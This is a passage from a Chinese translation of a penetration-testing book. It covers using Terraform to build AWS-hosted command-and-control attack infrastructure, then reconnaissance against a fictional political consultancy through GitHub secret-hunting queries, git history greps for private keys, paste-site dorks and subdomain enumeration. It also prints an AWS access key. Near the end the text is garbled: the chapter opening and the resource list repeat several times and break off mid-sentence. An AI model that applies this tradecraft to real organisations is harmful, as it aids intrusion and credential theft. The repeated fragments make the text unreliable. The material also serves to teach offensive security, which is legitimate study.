我不会过多谈论域名注册，因为我们的目标不是通过钓鱼入侵公司，所以我们将避免域名历史、分类、通过 DomainKeys Identified Mail (`DKIM`) 进行域名认证等方面的审查。所有这些都在我的书 How to Hack Like a Legend 中进行了详细探讨。

我们的基础设施现在几乎准备就绪。我们仍需要稍微调整我们的 C2 框架，准备 stagers，并启动监听器，但我们会在后面的章节中完成这些。

> NOTE `SILENTTRINITY` 和 Metasploit 都支持运行时文件或脚本来自动化 listener/stager 的设置。

### 自动化服务器设置

我们需要自动化的最后一个痛苦的经历是在云提供商上设置实际服务器。无论每个提供商虚假声称什么，人们仍然需要经历繁琐的菜单和标签页才能拥有一个可用的基础设施：防火墙规则、硬盘、机器配置、SSH 密钥、密码等等。



这一步骤与云提供商本身紧密相关。`AWS`、`Microsoft Azure`、`阿里巴巴`和`Google Cloud Platform`等巨头通过大量强大的`API`完全拥抱自动化，但其他云提供商似乎一点也不在乎。幸运的是，这对我们来说可能不是什么大问题，因为我们一次只管理三到四台服务器。我们可以轻松设置它们或从现有镜像克隆它们，并在三个`docker run`命令后拥有一个可用的`C2`基础设施。但如果我们能获得一张我们不介意与`AWS`共享的信用卡，我们也可以自动化最后这个繁琐的设置，并在这样做的过程中触及到对任何现代技术环境来说是或应该是根本的东西：基础设施即代码。

## 基础设施即代码

基础设施即代码基于这样一个想法：对任何给定时间应运行的组件有一个完整的声明性描述，从机器名称到其上安装的最后一个软件包。然后工具会解析此描述文件并纠正观察到的任何差异，例如更新防火墙规则、更改`IP`地址、附加更多磁盘或根据需要进行其他操作。如果资源消失，它将被重新带回生命以匹配所需状态。听起来很神奇，对吧？

多种工具可以让你实现这种自动化程度（无论是在基础设施层面还是操作系统层面），但我们将使用的工具称为`HashiCorp`的`Terraform`。

`Terraform`是开源的，并支持许多云提供商（在`https://registry.terraform.io`的文档中列出），这使得它成为你在选择接受`Zcash`的冷门提供商时的最佳选择。本章其余部分将重点关注`AWS`，因此你可以轻松复制代码并学习使用`Terraform`。

我想强调的是，这一步起初完全是可选的。自动化两三台服务器的设置可能花费的精力比节省的更多，因为我们已经拥有如此出色的容器设置，但自动化过程有助于我们探索当前的`DevOps`方法论，以便更好地理解一旦进入类似环境时应寻找什么。

`Terraform`与所有`Golang`工具一样，是一个静态编译的二进制文件，因此我们无需担心恶心的依赖项。我们`SSH`进入我们的跳板服务器并立即下载该工具，如下所示：

```
root@Bouncer:~/# wget\
https://releases.hashicorp.com/terraform/0.12.12/terraform_0.12.12_linux_amd64.zip

root@Bouncer:~/# unzip terraform_0.12.12_linux_amd64.zip
root@Bouncer:~/# chmod +x terraform
```

`Terraform`将使用我们提供的有效凭证与`AWS`云交互。前往`AWS IAM`——用户管理服务——创建一个程序化账户并授予其对所有`EC2`操作的完全访问权限。`EC2`是管理机器、网络、负载均衡器等的`AWS`服务。如果这是你第一次处理`AWS`，你可以通过搜索`https://serverless-stack.com/chapters/`来按照分步教程创建`IAM`上的账户。

在`IAM`用户创建面板中，为新创建的用户授予程序化访问权限，如图 3-5 所示。

![](img/961e81aef23040d0fbe348f58c055860_54_0.png)

图 3-5：创建名为`terraform`且具有`AWS API`访问权限的用户

通过附加`AmazonEC2FullAccess`策略，允许用户完全控制`EC2`以管理机器，如图 3-6 所示。

![](img/961e81aef23040d0fbe348f58c055860_54_1.png)

图 3-6：将策略`AmazonEC2FullAccess`附加到`terraform`用户

将凭证下载为`.csv`文件。注意访问密钥`ID`和秘密访问密钥，如图 3-7 所示。我们接下来需要这些。

![](img/961e81aef23040d0fbe348f58c055860_54_2.png)

图 3-7：查询`AWS API`的`API`凭证

一旦拥有`AWS`访问密钥和秘密访问密钥，请下载`AWS`命令行工具并保存你的凭证：

```
root@Bouncer:~/# apt install awscli
root@Bouncer:~/# aws configure
```

`AWS Access Key ID [None]: AKIA44ESW0EAASQDF5A0`

`AWS Secret Access Key [None]: DEqg5dDxDA4uSQ6xXdhvu7Tzi53…`

`Default region name [None]: eu-west-1`

我们然后设置一个文件夹来托管基础设施的配置：

```
root@Bouncer:~# mkdir infra && cd infra
```

接下来，我们创建两个文件：`provider.tf`和`main.tf`。在前者中，我们初始化`AWS`连接器，加载凭证，并为我们打算创建的资源分配默认区域，例如`eu-west-1`（爱尔兰），如下所示：

```
#### provider.tf
provider "aws" {
  region  = "eu-west-1"
  version = "~> 2.28"
}
```

在`main.tf`中我们将放置架构定义的大部分内容。`Terraform`中的原始结构之一是资源——描述云提供商服务离散单元的元素，例如服务器、`SSH`密钥、防火墙规则等等。粒度水平取决于云服务，并且可能迅速增长到荒谬的复杂程度，但这是灵活性的代价。

要让`Terraform`生成服务器，我们只需定义`aws_instance`资源，如下所示：

```
#### main.tf
resource "aws_instance" "basic_ec2" {
  ami           = "ami-0039c41a10b230acb"
  instance_type = "t2.micro"
}
```

我们的`basic_ec2`资源是一个服务器，它将启动由`ami-0039c41a10b230acb`标识的`Amazon Machine Image (AMI)`，该镜像恰好是`Ubuntu 18.04`镜像。你可以在`https://cloud-images.ubuntu.com/locator/ec2/`检查所有准备好的`Ubuntu`镜像。服务器（或实例）类型为`t2.micro`，它提供`1GB`内存和一个`vCPU`。

> NOTE

`Terraform`文档非常有教益且有帮助，因此在构建资源时不要犹豫去阅读它：`https://www.terraform.io/docs/.`

我们保存`main.tf`并初始化`Terraform`，以便它可以下载`AWS`提供程序：

```
root@Bouncer:~/infra# terraform init
Initializing the backend...
Initializing provider plugins...
- Downloading plugin for provider "aws"

Terraform has been successfully initialized!
```

接下来，我们执行`terraform fmt`命令来格式化`main.tf`，然后执行`plan`指令以构建即将对基础设施进行的更改列表，如下所示。你可以看到我们的服务器已安排好使用我们之前定义的属性启动。相当不错。

```
root@Bounce:~/infra# terraform fmt && terraform plan
Terraform will perform the following actions:

  # aws_instance.basic_ec2 will be created
  + resource "aws_instance" "basic_ec2" {
      + ami             = "ami-0039c41a10b230acb"
      + arn             = (known after apply)
      + associate_public_ip_address = (known after apply)
      + instance_type   = "t2.micro"
  }
--snip--

Plan: 1 to add, 0 to change, 0 to destroy.
```

一旦我们验证了这些属性，我们就调用`terraform apply`在`AWS`上部署服务器。此操作还会本地创建一个状态文件，描述我们刚刚创建的当前资源——一台服务器。

如果我们在`AWS`上手动终止服务器并重新启动`terraform apply`，它将检测到本地状态文件与我们`EC2`实例当前状态之间的差异。它将通过重新创建服务器来解决此类差异。如果我们想再启动九台具有相同配置的服务器，我们将`count`属性设置为`10`并再次运行`apply`。



尝试手动在 AWS（或任何云提供商）上启动和管理 10 台或 20 台服务器，你很快就会把头发染成绿色，把脸涂成白色，并在纽约市街头跳舞。使用 Terraform 的我们其他人只需更新一个数字，如 `Listing 3-4` 所示，然后在理智中继续我们的生活。

```
#### main.tf launching 10 EC2 servers
resource "aws_instance" "basic_ec2" {
  ami          = "ami-0039c41a10b230acb"
  count        = 10
  instance_type = "t2.micro"
}
```

`Listing 3-4`: 使用 Terraform 创建 10 个 EC2 实例的最小代码

### 调整服务器

我们的服务器到目前为止相当基础。让我们通过设置以下属性来微调它：

- 我们可以通过 SSH 密钥远程管理它，这转化为一个名为 `aws_key_pair` 的 Terraform 资源。
- 一组防火墙规则——在 AWS 术语中称为安全组——用于控制哪些服务器可以相互通信以及如何通信。这由 Terraform 资源 `aws_security_group` 定义。安全组需要附加到虚拟私有云（VPC），即一种虚拟化网络。我们只需使用 AWS 创建的默认 VPC。
- 分配给每个服务器的公网 IP。

`Listing 3-5` 显示了设置了这些属性的 `main.tf`。

```
#### main.tf - compatible with Terraform 0.12 only

#### We copy-paste our SSH public key
① resource "aws_key_pair" "ssh_key" {
  key_name  = "mykey"
  public_key = "ssh-rsa AAAAB3NzaC1yc2EAAA..."
}

#### Empty resource, since the default AWS VPC (network) already exists
resource "aws_default_vpc" "default" {
}

#### Firewall rule to allow SSH from our bouncing server IP only
#### All outgoing traffic is allowed
② resource "aws_security_group" "SSHAdmin" {
  name        = "SSHAdmin"
  description = "SSH traffic"
  vpc_id      = aws_default_vpc.default.id
  ingress {
    from_port   = 0
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["123.123.123.123/32"]
  }
  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}

#### We link the SSH key and security group to our basic_ec2 server

resource "aws_instance" "basic_ec2" {
  ami           = "ami-0039c41a10b230acb"
  instance_type = "t2.micro"

  vpc_security_group_ids  = aws_security_group.SSHAdmin.id
  ③ key_name             = aws.ssh_key.id
  associate_public_ip_address = "true"
  root_block_device {
    volume_size = "25"
  }
}
```

```
#### We print the server's public IP
output "public_ip" {
  value = aws_instance.basic_ec2.public_ip
}
```

#### `Listing 3-5`: 向 `main.tf` 添加一些属性

如前所述，`aws_key_pair` 在 AWS 上注册 SSH 密钥 ①，该密钥在首次启动时注入到服务器中。Terraform 上的每个资源之后都可以通过其 ID 变量引用，该变量在运行时填充——在这种情况下为 `aws.ssh_key.id` ③。这些特殊变量的结构始终相同：`resourceType.resourceName.internalVariable`。

`aws_security_group` 没有什么新颖之处 ②，或许除了对默认 VPC 的引用外，默认 VPC 是 AWS 创建的默认虚拟网络段（如果愿意，可以类比为路由器的接口）。防火墙规则仅允许来自我们的跳板服务器的入站 SSH 流量。

我们启动另一个 `plan` 命令，以便确保所有属性和资源都符合我们的预期结果，如 `Listing 3-6` 所示。

```
root@Bounce:~/infra# terraform fmt && terraform plan
Terraform will perform the following actions:

  # aws_instance.basic_ec2 will be created
  + resource "aws_key_pair" "ssh_key2" {
      + id         = (known after apply)
      + key_name   = "mykey2"
      + public_key = "ssh-rsa AAAAB3NzaC1yc2..."
    }

  + resource "aws_security_group" "SSHAdmin" {
      + arn         = (known after apply)
      + description = "SSH admin from bouncer"
      + id          = (known after apply)
--snip--
    }

  + resource "aws_instance" "basic_ec2" {
      + ami                         = "ami-0039c41a10b230acb"
      + arn                         = (known after apply)
      + associate_public_ip_address = true
      + id                          = (known after apply)
      + instance_type               = "t2.micro"
--snip--

Plan: 3 to add, 0 to change, 0 to destroy.
```

#### `Listing 3-6`: 检查属性是否定义良好

Terraform 将创建三个资源。很好。

作为最后一个细节，我们需要指示 AWS 在机器启动并运行时安装 Docker 并启动我们的容器 Nginx。AWS 利用安装在大多数 Linux 发行版上的 `cloud-init` 包在机器首次启动时执行脚本。这实际上就是 AWS 注入我们之前定义的公钥的方式。此脚本称为“用户数据”。

修改 `main.tf` 以添加安装 Docker 并执行容器的 bash 命令，如 `Listing 3-7` 所示。

```
resource "aws_instance" "basic_ec2" {
--snip--
① user_data = <<EOF

#!/bin/bash
DOMAIN="www.linux-update-packets.org";
C2IP="172.31.31.13";

sleep 10
sudo add-apt-repository \
  "deb [arch=amd64] https://download.docker.com/linux/ubuntu \
  $(lsb_release -cs) \
  stable"
apt update
apt install -y docker-ce
docker run -dti -p80:80 -p443:443 \
 -e DOMAIN="www.customdomain.com" \
 -e C2IP="$C2IP" \
 -v /opt/letsencrypt:/etc/letsencrypt \
 sparcflow/nginx

EOF
}
```

#### `Listing 3-7`: 从 `main.tf` 启动容器



EOF 块 ① 包含一个多行字符串，使得注入由其他 Terraform 资源产生的值的环境变量变得容易。在此示例中我们对 C2 的 IP 和域名进行了硬编码，但在现实生活中这些将是负责启动后端 C2 服务器的其他 Terraform 资源的输出。

`NOTE` 除了在 Listing 3-7 中对域名进行硬编码外，我们还可以进一步扩展 Terraform 以使用 Namecheap 提供程序自动创建和管理 DNS 记录，例如：https://github.com/adamdecaf/terraform-provider-namecheap。

### 推送到生产环境

我们现在准备好通过简单的 `terraform apply` 将其推送到生产环境，这将再次输出计划并在联系 AWS 创建请求的资源之前请求手动确认：

```
root@Bounce:~/infra# terraform fmt && terraform apply

aws_key_pair.ssh_key: Creation complete after 0s [id=mykey2]
aws_default_vpc.default: Modifications complete after 1s [id=vpc-b95e4bdf]
--snip--
aws_instance.basic_ec2: Creating...
```

```
aws_instance.basic_ec2: Creation complete after 32s [id=i-089f2eff84373da3d]

Apply complete! Resources: 3 added, 0 changed, 0 destroyed.
Outputs:

public_ip = 63.xx.xx.105
```

太棒了。我们可以使用默认的 ubuntu 用户名和私有 SSH 密钥通过 SSH 连接到实例，以确保一切运行顺畅：

```
root@Bounce:~/infra# ssh -i .ssh/id_rsa ubuntu@63.xx.xx.105

Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-1044-aws x86_64)

ubuntu@ip-172-31-30-190:~$ docker ps
CONTAINER ID   IMAGE          COMMAND
5923186ffda5   sparcflow/ngi...   "/bin/bash /sc..."
```

完美。现在我们已经完全自动化了服务器的创建、设置和调优，我们可以释放内心的野人，复制这段代码以根据需要生成任意数量的服务器，具有不同的防火墙规则、用户数据脚本和其他设置。当然，更文明的方法是将我们刚刚编写的代码封装在 Terraform 模块中，并根据需要传递不同的参数。详情请参阅书籍仓库中 `infra/ec2_module`，网址为 `www.nostarch.com/how-hack-ghost`。

我不会在本已密集的章节中逐步介绍重构过程。重构大多是外观上的，例如在单独文件中定义变量、创建多个安全组、在用户数据脚本中将私有 IP 作为变量传递等等。我相信到现在为止你已经具备足够的实践知识，可以从 GitHub 仓库中提取最终的重构版本并尽情使用。

本章的主要目标是向你展示我们如何在恰好 60 秒内启动一个完全功能齐全的攻击基础设施，因为这就是整个操作的威力：自动化可重复性，这是任何点按操作都无法提供的。

我们只需几个命令即可部署攻击服务器：

```
root@Bounce:~# git clone your_repo
root@Bounce:~# cd infra && terraform init
#### update a few variables
root@Bounce:~# terraform apply
--snip--

Apply complete! Resources: 7 added, 0 changed, 0 destroyed.
Outputs:

nginx_ip_address = 63.xx.xx.105
c2_ip_address = 63.xx.xx.108
```

我们的基础设施终于准备就绪！

### 资源

- 在 http://bit.ly/2FoW0nI 查看 Taylor Brown 的文章“使用 Windows Server Containers 将 Docker 引入 Windows 开发者”。
- 在 http://bit.ly/2ZVRGpy 找到一篇关于容器运行时泛滥的精彩文章。
- Liz Rice 在她的演讲“Building a Container from Scratch in Go”中通过实时编码揭开运行时的神秘面纱，该演讲可在 YouTube 上观看。
- Scott Lowe 在 https://blog.scottlowe.org/ 上提供了关于网络命名空间的简短实用介绍。
- Jérôme Petazzoni 提供了关于命名空间、cgroups 和 UFS 的更多信息，可在 YouTube 上观看。

## 第二部分

### 更努力尝试

> 你不太可能在不大量练习旧东西的情况下发现新事物。
>
> Richard P. Feynman

### 4 健康的跟踪

![](img/961e81aef23040d0fbe348f58c055860_65_0.png)

我们的弹跳服务器正默默地在欧洲某地的某处数据中心嗡嗡作响。我们的攻击基础设施正急切地等待着我们的第一个命令。在我们释放那些常规充斥 InfoSec Twitter 时间线的众多攻击工具之前，让我们花几分钟时间来了解我们的目标——政治咨询公司 Gretsch Politico——实际上是如何运作的。他们的商业模式是什么？他们提供哪些产品和服务？这种信息将为我们提供一个方向，并帮助我们缩小攻击目标。制定切实的目标也许是我们面临的第一个挑战。他们的



我们的弹跳服务器正默默地在欧洲某地的某处数据中心嗡嗡作响。我们的攻击基础设施正急切地等待着我们的第一个命令。在我们释放那些常规充斥 InfoSec Twitter 时间线的众多攻击工具之前，让我们花几分钟时间来了解我们的目标——政治咨询公司 Gretsch Politico——实际上是如何运作的。他们的商业模式是什么？他们提供哪些产品和服务？这种信息将为我们提供一个方向，并帮助我们缩小攻击目标。制定切实的目标也许是我们面临的第一个挑战。他们的

### 资源

- 在 `http://bit.ly/2FoW0nI` 查看 Taylor Brown 的文章“使用 Windows Server Containers 将 Docker 引入 Windows 开发者”。
- 在 `http://bit.ly/2ZVRGpy` 找到一篇关于容器运行时泛滥的精彩文章。
- Liz Rice 在她的演讲“Building a Container from Scratch in Go”中通过实时编码揭开运行时的神秘面纱，该演讲可在 YouTube 上观看。
- Scott Lowe 在 `https://blog.scottlowe.org/` 上提供了关于网络命名空间的简短实用介绍。
- Jérôme Petazzoni 提供了关于命名空间、`cgroups` 和 UFS 的更多信息，可在 YouTube 上观看。

## 第二部分

### 更努力尝试

> 你不太可能在不大量练习旧东西的情况下发现新事物。

Richard P. Feynman

### 4 健康的跟踪

![](img/961e81aef23040d0fbe348f58c055860_65_0.png)

我们的弹跳服务器正默默地在欧洲某地的某处数据中心嗡嗡作响。我们的攻击基础设施正急切地等待着我们的第一个命令。在我们释放那些常规充斥 InfoSec Twitter 时间线的众多攻击工具之前，让我们花几分钟时间来了解我们的目标——政治咨询公司 Gretsch Politico——实际上是如何运作的。他们的商业模式是什么？他们提供哪些产品和服务？这种信息将为我们提供一个方向，并帮助我们缩小攻击目标。制定切实的目标也许是我们面临的第一个挑战。他们的

### 资源

- 在 `http://bit.ly/2FoW0nI` 查看 Taylor Brown 的文章“使用 Windows Server Containers 将 Docker 引入 Windows 开发者”。
- 在 `http://bit.ly/2ZVRGpy` 找到一篇关于容器运行时泛滥的精彩文章。
- Liz Rice 在她的演讲“Building a Container from Scratch in Go”中通过实时编码揭开运行时的神秘面纱，该演讲可在 YouTube 上观看。
- Scott Lowe 在 `https://blog.scottlowe.org/` 上提供了关于网络命名空间的简短实用介绍。
- Jérôme Petazzoni 提供了关于命名空间、`cgroups` 和 UFS 的更多信息，可在 YouTube 上观看。



- 在 `http://bit.ly/2FoW0nI` 查看 Taylor Brown 的文章“使用 Windows Server Containers 将 Docker 引入 Windows 开发者”。

- 在 `http://bit.ly/2ZVRGpy` 找到一篇关于容器运行时泛滥的精彩文章。

- Liz Rice 在她的演讲“Building a Container from Scratch in Go”中通过实时编码揭开运行时的神秘面纱，该演讲可在 YouTube 上观看。

- Scott Lowe 在 `https://blog.scottlowe.org/` 上提供了关于网络命名空间的简短实用介绍。

- Jérôme Petazzoni 提供了关于命名空间、cgroups 和 UFS 的更多信息，可在 YouTube 上观看。

## 第二部分

### 更努力尝试

> 你不太可能在不大量练习旧东西的情况下发现新事物。

Richard P. Feynman

### 4 健康的跟踪

![](img/961e81aef23040d0fbe348f58c055860_65_0.png)

我们的弹跳服务器正默默地在欧洲某地的某处数据中心嗡嗡作响。我们的攻击基础设施正急切地等待着我们的第一个命令。在我们释放那些常规充斥 InfoSec Twitter 时间线的众多攻击工具之前，让我们花几分钟时间来了解我们的目标——政治咨询公司 Gretsch Politico——实际上是如何运作的。他们的商业模式是什么？他们提供哪些产品和服务？这种信息将为我们提供一个方向，并帮助我们缩小攻击目标。制定切实的目标也许是我们面临的第一个挑战。他们的

### 资源

- 在 `http://bit.ly/2FoW0nI` 查看 Taylor Brown 的文章“使用 Windows Server Containers 将 Docker 引入 Windows 开发者”。

- 在 `http://bit.ly/2ZVRGpy` 找到一篇关于容器运行时泛滥的精彩文章。

- Liz Rice 在她的演讲“Building a Container from Scratch in Go”中通过实时编码揭开运行时的神秘面纱，该演讲可在 YouTube 上观看。

- Scott Lowe 在 `https://blog.scottlowe.org/` 上提供了关于网络命名空间的简短实用介绍。

- Jérôme Petazzoni 提供了关于命名空间、cgroups 和 UFS 的更多信息，可在 YouTube 上观看。



# Richard P. Feynman

## 4 健康的跟踪

我们的弹跳服务器正默默地在欧洲某地的数据中心嗡嗡作响。攻击基础设施正等待首个指令。在释放常刷屏 InfoSec Twitter 的攻击工具前，先花几分钟了解目标政治咨询公司 Gretsch Politico 的运作。该公司商业模式是什么？提供什么产品服务？这些信息能指明方向并缩小攻击目标。制定具体目标可能是首要挑战。该公司

### 资源

- 在 `http://bit.ly/2FoW0nI` 查看 Taylor Brown 的文章“使用 Windows Server Containers 将 Docker 引入 Windows 开发者”。
- 在 `http://bit.ly/2ZVRGpy` 找到一篇关于容器运行时泛滥的精彩文章。
- Liz Rice 在她的演讲“Building a Container from Scratch in Go”中通过实时编码揭开运行时的神秘面纱，该演讲可在 YouTube 上观看。
- Scott Lowe 在 `https://blog.scottlowe.org/` 上提供了关于网络命名空间的简短实用介绍。
- Jérôme Petazzoni 提供了关于命名空间、`cgroups` 和 `UFS` 的更多信息，可在 YouTube 上观看。

在接下来的几章中，我们将尝试回答这些问题。议程相当雄心勃勃，所以我希望你和我一样兴奋，能够深入这个奇怪的数据采集和欺骗世界。

### 搜刮 GitHub

Gretsch Politico 和 MXR Ads 方法论的几乎每一次展示中反复出现的主题是它们在研究和设计以及专有机器学习算法方面的投入。像这样的技术导向型公司很可能会在公共代码仓库中发布一些源代码，用于各种目的，例如作为诱饵用于招揽人才的对开源世界的少量贡献、某些 API 的部分文档、代码示例等等。我们也许能找到一些包含被忽略的密码或指向其管理平台的敏感链接的材料。祝好运！

在 GitHub 上搜索公共代码仓库相当容易；你甚至不需要注册免费账号。只需继续查找诸如“Gretsch Politico”和“MXR Ads”之类的关键词即可。图 4-3 显示了我们搜索 MXR Ads 仓库时的结果。

![](img/961e81aef23040d0fbe348f58c055860_69_0.png)

*图 4-3：MXR Ads 的 GitHub 仓库*

一个公司拥有 159 个公共仓库？这似乎很多。在粗略检查后，很明显其中只有大约半打仓库真正属于 MXR Ads 或其员工。剩下的只是简单的 fork（复制的仓库），恰好提到了 MXR Ads——例如在广告拦截列表中。这些被 fork 的仓库几乎没有价值，所以我们将专注于那半打原始仓库。幸运的是，GitHub 提供了一些模式来剔除不需要的输出。使用两个搜索前缀 `org:` 和 `repo:`，我们可以将结果范围限制在我们认为相关的少数账号和仓库上。

我们开始寻找硬编码的密钥，例如 SQL 密码、`AWS` 访问密钥、`Google Cloud` 私钥、`API` 令牌，以及公司广告平台上的测试账号。基本上，我们想要任何可能让我们获得首次珍贵访问权限的东西。

我们在 GitHub 搜索中输入这些查询，看看会得到什么：

```
#### Sample of Github queries

org:mxrAds  password
org:mxrAds  aws_secret_access_key
org:mxrAds  aws_key
org:mxrAds  BEGIN RSA PRIVATE KEY
org:mxrAds  BEGIN OPENSSH PRIVATE KEY
org:mxrAds  secret_key
org:mxrAds  hooks.slack.com/services
org:mxrAds  sshpass -p
org:mxrAds  sq0csp
org:mxrAds  apps.googleusercontent.com
org:mxrAds  extension:pem key
```

GitHub 搜索 API 的恼人限制是它会过滤掉特殊字符。当我们搜索“aws_secret_access_key”时，GitHub 会返回匹配其中任意四个单独单词（aws、secret、access 或 key）的代码片段。这大概是我唯一真心怀念正则表达式的时候。

> NOTE
> GitHub 的替代品 Bitbucket 并未提供类似的搜索栏。它甚至明确指示搜索引擎跳过包含代码更改（称为提交）的 URL。别担心：Yandex.ru 有不顾这些规则的坏习惯，会很乐意使用类似 `site:bitbucket.org inurl:master` 的查询向你展示 Bitbucket 公共仓库上的每个 master 分支和提交历史。

请记住，这一阶段的侦察不仅仅是盲目抓取悬空的密码；它还涉及发现 URL 和 API 端点，并熟悉这两个公司的技术偏好。每个团队都有关于使用哪种框架和哪种语言工作的某些教条。这些信息以后可能有助于我们调整我们的有效载荷。

不幸的是，初步的 GitHub 搜索查询没有返回任何有价值的东西，所以我们祭出大招，彻底绕过 GitHub 的限制。既然我们只针对少数几个仓库，我们将把整个仓库下载到磁盘，以 unleash 老好 `grep` 的全部威力！

我们将从 `shhgit` 中定义的数百个有趣的正则表达式（`regex`）模式列表开始，这是一个专门用于在 GitHub 中查找密钥的工具，从常规密码到 API 令牌（`https://github.com/eth0izzle/shhgit/`）。该工具本身对防御者也非常有用，因为它通过监听 `webhook` 事件来标记推送到 GitHub 的敏感数据——`webhook` 是在给定事件后对 URL 的调用。在这种情况下，每当正则表达式匹配到提交代码中的字符串时，GitHub 都会向预定义的网页发送 POST 请求。

我们重新整理该模式列表，你可以在 `https://www.hacklikeapornstar.com/secret_regex_patterns.txt` 找到它，使其适合 `grep`。然后我们下载所有仓库：

```
root@Point1:~# while read p; do \
git clone www.github.com/MXRads/$p\
done <list_repos.txt
```

开始搜索：

```
root@Point1:~# curl -vs
https://gist.github.com/HackLikeAPornstar/ff2eabaa8e007850acc158ea3495e95f
> regex_patterns.txt

root@Point1:~# egrep -Ri -f regex_patterns.txt *
```

这个简陋的命令将搜索下载仓库中的每个文件中的内容。然而，由于我们处理的是 Git 仓库，`egrep` 将省略 Git 内部文件系统结构（`.git` 文件夹）中被压缩并隐藏起来的旧版本代码。这些旧文件版本当然是最有价值的资产！想想所有因错误而推送的凭证或在项目早期阶段硬编码的凭证。著名的那句“这只是临时修复”在版本化仓库中从未比这更致命。

`git` 命令提供了我们用来回溯提交历史的必要工具：`git rev-list`、`git log`、`git revert`，以及对我们最相关的 `git grep`。与常规 `grep` 不同，`git grep` 需要一个提交 ID，我们使用 `git rev-list` 提供。通过使用 `xargs`（扩展参数）将两个命令链接起来，我们可以检索所有提交 ID（仓库中曾经做过的所有更改），并使用 `git grep` 搜索其中每一个以查找有趣的模式：

```
root@Point1:~# git rev-list --all | xargs git grep "BEGIN [EC|RSA|DSA|OPENSSH] PRIVATE KEY"
```

我们也可以使用 bash 循环自动化此搜索，或完全依赖 `Gitleaks`（`https://github.com/zricethezav/gitleaks/`）或 `truffleHog`（`https://github.com/dxaa4481/truffleHog/`）等工具来处理所有提交文件的筛选。

在花了几个小时以各种方式扭曲那段公共源代码后，有一件事变得很清楚：似乎没有任何硬编码凭证。甚至连一个假的虚拟测试或测试账号来提升我们的热情都没有。MXR Ads 和 GP 要么善于隐藏，要么我们只是运气不好。无论如何，我们继续前进！

GitHub 的一个功能大多数人往往会忽略的是能够在 `https://gist.github.com` 上分享代码片段的能力，该服务也由 `https://pastebin.com/` 提供。这些两个网站，以及 `https://codepen.io/` 等其他网站，通常包含代码片段、数据库提取物、存储桶、配置文件，以及开发者希望快速交换的任何内容。我们将使用一些搜索引擎命令从这些网站抓取一些结果：



```
#### Documents on gist.github.com
site:gist.github.com "mxrads.com"

#### Documents on Pastebin
site:pastebin.com "mxrads.com"

#### Documents on JustPaste.it
site:justpaste.it "mxrads.com"

#### Documents on PasteFS
site:pastefs.com "mxrads.com"

#### Documents on CodePen
site:codepen.io "mxrads.com"
```

一次搜索产生了图 4-4 所示的结果。

![](img/961e81aef23040d0fbe348f58c055860_72_0.png)

图 4-4：MXR Ads 日志文件的一个片段

这似乎是一个日志文件提取物，挂在公共 Gist 上，供任何人查看。这不是很可爱吗？遗憾的是，没有立即获得关键信息，但我们确实得到了这些独特的 URL：

- format-true-v1.qa.eww1.mxrads.com

- dash-v3-beta.gretschpolitico.com

- www.surveysandsstats.com/9df6c8db758b35fa0f1d73...

我们在浏览器中测试这些。第一个链接超时，第二个链接重定向到 Google 认证页面（见图 4-5）。

![](img/961e81aef23040d0fbe348f58c055860_72_1.png)

图 4-5：在日志文件片段中发现的 Gretsch Politico 登录链接

Gretsch Politico 显然订阅了 Google Workspace（前称 G Suite）应用来管理其企业电子邮件，很可能还管理其用户目录和内部文档。我们会在稍后开始搜刮数据时记住这一点。

第三个 URL，指向图 4-6，很有希望。

![](img/961e81aef23040d0fbe348f58c055860_73_0.png)

图 4-6：在日志文件片段中发现的指向 MXR 广告调查的链接

这必定是 MXR Ads 用于收集看似无害的人们信息的那种调查之一。尝试通过他们其中一种险恶的表单来入侵 MXR Ads 或 Gretsch Politico 颇具诱惑力，但我们仍处于侦察工作的中间阶段，所以让我们先记下这一点以便稍后尝试。

### 拉取 Web 域名

被动侦察迄今为止并未为我们带来太多入口点。我认为是时候我们认真开始挖掘与 MXR Ads 和 Gretsch Politico 相关的所有域名和子域名了。我确信我们能找到比遗忘的 Gist 粘贴中那三个可怜的网站多得多的东西。希望我们能登陆到一个荒废的网站上，那里有一个狡猾的漏洞在迎接我们进入。

我们将首先通过检查证书日志中的子域名来开始搜索。

#### 来自证书

Censys (`https://censys.io/`) 是一款常规扫描证书日志以摄取所有新签发 TLS 证书的工具，并且是任何渗透测试人员域名发现工具列表中的头号工具。在由证书颁发机构签发后，证书会被推送到一个名为证书日志的中央存储库中。该存储库保存所有证书的二叉树，其中每个节点都是其子节点的哈希值，从而保证整个链的完整性。这大致遵循比特币区块链所采用的相同原理。理论上，所有签发的 TLS 证书都应公开发布，以检测域名欺骗、拼写错误抢注、同形异义字攻击以及其他欺骗和重定向用户的恶作剧方式。

我们可以搜索这些证书日志，以挖掘出符合某些条件的任何新注册，例如“mxr ads”。这幅美丽画布的丑陋一面是，所有域名和子域名名称都可在网上公开访问。因此，隐藏在 obscure 域名后面的安全性极低的秘密应用很容易暴露。Censys 和 `crt.sh` 之类的工具会探索这些证书日志，并至少将子域名枚举的速度提高一个数量级——残酷地提醒我们，即使是最甜的葡萄也可能隐藏最苦的种子。在图 4-7 中，我们使用 Censys 搜索 `gretschpolitico.com` 的子域名。

![](img/961e81aef23040d0fbe348f58c055860_74_0.png)

图 4-7：使用 Censys 查找子域名

透明度就这样了。似乎 GP 并没有费心注册子域名证书，而是选择了通配符证书：一种匹配任何子域名的通用证书。一个证书统治它们全部。无论这是出色的安全举措还是纯粹的懒惰，事实是，我们没有比顶级域名更进一步。我们在 Censys 中尝试其他顶级域名——`gretschpolitico.io`、`mxrads.tech`、`mxrads.com`、`gretschpolitico.news` 等等——但同样一无所获。我们的域名列表增长了令人震惊的胖胖的大零……但不要绝望！我们还有其他集体袖子里的技巧。

> **注意** 当然，通配符证书带来了另一个安全问题：它们是公然的单点故障。如果我们在漫游公司网络时偶然发现私钥，我们就可以拦截使用同一父域名的所有应用程序的通信流。

#### 通过收割互联网

如果证书不是收集子域名的途径，那么也许互联网可以伸出援手。`Sublist3r` 是一个很棒且易于使用的工具，可从各种来源收割子域名：搜索引擎、PassiveDNS，甚至 VirusTotal。首先，我们从官方仓库获取该工具并安装依赖项：

```
root@Point1:~# git clone https://github.com/aboul3la/Sublist3r
root@Point1:sub/# python -m pip install -r requirements.txt
```

然后我们继续搜索子域名，如清单 4-1 所示。

```
root@Point1:~# python sublist3r.py -d gretschpolitico.com
[-] Enumerating subdomains now for gretschpolitico.com
[-] Searching now in Baidu..
[-] Searching now in Yahoo..
[-] Searching now in Netcraft..
[-] Searching now in DNSdumpster..
--snip--
